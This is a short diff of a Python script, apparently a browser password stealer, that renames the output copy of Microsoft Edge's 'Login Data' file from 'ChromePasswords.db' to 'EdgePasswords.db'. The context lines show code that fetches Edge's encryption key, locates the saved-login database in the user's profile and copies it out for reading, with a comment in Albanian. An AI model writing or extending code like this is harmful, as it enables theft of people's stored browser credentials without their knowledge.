@@ -58,7 +58,7 @@ def edge():
     key = fetching_encryption_key_edge()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "Default", "Login Data")
-    filename = "ChromePasswords.db"
+    filename = "EdgePasswords.db"
     shutil.copyfile(db_path, filename)
 
     # Lidhje ne databaz
